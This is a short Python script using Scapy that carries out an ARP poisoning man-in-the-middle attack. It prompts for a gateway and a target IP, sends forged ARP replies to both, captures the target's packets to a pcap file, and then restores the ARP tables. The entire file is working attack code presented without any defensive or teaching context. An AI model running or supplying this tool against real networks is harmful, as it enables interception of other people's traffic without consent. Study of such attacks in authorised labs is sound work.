#!/bin/python3

from scapy.all import *
import threading,time


conf.verb = 0

gateway_ip = input('Enter GateWay\'s IP : ')
target_ip = input('Enter Target\'s IP : ')

def get_mac(ip):
	response,wasted = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=2,retry=10,verbose=0)
	for sent,recieved in response:
		return recieved[Ether].src
	return None

def restore_attack(gateway_ip,gateway_mac,target_ip,target_mac):
	print('\nRESTORING ATTACK!')
	gateway_restore = ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=target_mac)
	target_restore = ARP(op=2,psrc=gateway_ip,hwsrc=gateway_mac,pdst=target_ip,hwdst=target_mac)
	send(gateway_restore,verbose=0)
	send(target_restore,verbose=0)

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
	gateway_poison = ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac)
	target_poison = ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac)

	print('[+] STARTED ATTACK !')
	print('ctrl + c --> To Stop !')
	
	while True:
		try:
			send(gateway_poison,verbose=0)
			send(target_poison,verbose=0)
			catch_data()
			restore_attack(gateway_ip,gateway_mac,target_ip,target_mac)
			time.sleep(2)
			break
		except KeyboardInterrupt:
			restore_attack(gateway_ip,gateway_mac,target_ip,target_mac)
			break
	print(f'ATTACK FINISHED !')
	return 

def catch_data():
	print('Catching Packets!')
	packets = sniff(filter=f'ip host {target_ip}',iface='eth0',count=100)
	wrpcap('data.pcap',packets)
	print('Saved Packets')
	return 

gateway_mac = get_mac(gateway_ip)
if gateway_mac != None:
	print(f'\nGATEWAY\'S MAC : {gateway_mac}\n')
target_mac = get_mac(target_ip)
if target_mac != None:
        print(f'TARGET\'S MAC : {target_mac}')

poison_target(gateway_ip,gateway_mac,target_ip,target_mac)



